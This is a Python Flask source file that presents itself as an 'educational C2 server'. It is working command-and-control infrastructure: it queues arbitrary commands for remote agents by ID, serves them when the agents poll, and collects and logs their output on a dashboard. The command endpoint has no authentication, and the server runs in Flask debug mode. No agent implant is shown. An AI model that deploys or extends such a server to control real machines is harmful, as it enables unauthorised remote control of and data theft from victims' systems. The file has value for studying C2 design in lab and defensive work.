from flask import Flask, request, jsonify, render_template
from datetime import datetime

app = Flask(__name__)

pending_commands = {}
agent_logs = {}

@app.route("/")
def home():
    return "<h1>Servidor C2 Educacional</h1><p>Vá para <a href='/dashboard'>Dashboard</a></p>"

@app.route("/dashboard")
def dashboard():
    return render_template("dashboard.html", agents=agent_logs)

@app.route("/get-command/<agent_id>", methods=["GET"])
def get_command(agent_id):
    command = pending_commands.pop(agent_id, "")
    return jsonify({"command": command})

@app.route("/send-result/<agent_id>", methods=["POST"])
def receive_result(agent_id):
    data = request.json
    result = data.get("result", "")
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    if agent_id not in agent_logs:
        agent_logs[agent_id] = []

    agent_logs[agent_id].append((timestamp, result))
    print(f"[{timestamp}] [{agent_id}] => {result}")
    return jsonify({"status": "ok"})

@app.route("/send-command/<agent_id>", methods=["POST"])
def send_command(agent_id):
    data = request.json
    command = data.get("command", "")
    pending_commands[agent_id] = command
    return jsonify({"status": "command queued"})

@app.route("/get-logs/<agent_id>")
def get_logs(agent_id):
    logs = agent_logs.get(agent_id, [])
    return jsonify({"logs": logs})

if __name__ == "__main__":
    app.run(debug=True)
